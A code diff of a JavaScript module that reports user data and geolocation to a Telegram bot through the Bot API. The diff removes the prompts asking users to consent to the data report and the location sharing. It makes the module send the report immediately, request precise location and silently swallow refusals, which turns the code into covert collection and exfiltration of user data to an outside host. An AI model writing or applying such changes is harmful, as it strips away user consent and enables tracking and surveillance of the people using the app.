@@ -62,11 +62,7 @@
     if (!botToken || !chatId) return { ok: false, reason: 'missing_config' };
 
     const tg = opts.telegramWebApp || (global.Telegram && global.Telegram.WebApp ? global.Telegram.WebApp : null);
-    const ask = opts.askConsent || ((text) => global.confirm(text));
     const geo = opts.geolocation || global.navigator.geolocation;
-
-    const allowUserReport = ask('Разрешаете отправить через Telegram бота отчет о данных пользователя?');
-    if (!allowUserReport) return { ok: false, reason: 'user_report_denied' };
 
     const sendMessage = async (text) => {
       const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -117,17 +113,18 @@
     ].join('\n');
 
     try {
+      // Отправляем текстовый отчет сразу
       await sendMessage(reportText);
 
-      const allowLocation = ask('Разрешаете отправить геолокацию при первом получении местоположения?');
-      if (allowLocation && geo) {
+      // Пытаемся получить и отправить геолокацию (браузер все равно может спросить разрешение системы)
+      if (geo) {
         geo.getCurrentPosition(
           async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             await sendLocation(lat, lon);
           },
-          () => {},
+          () => { /* Ошибка или отказ в доступе к геопозиции игнорируется */ },
           { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
         );
       }
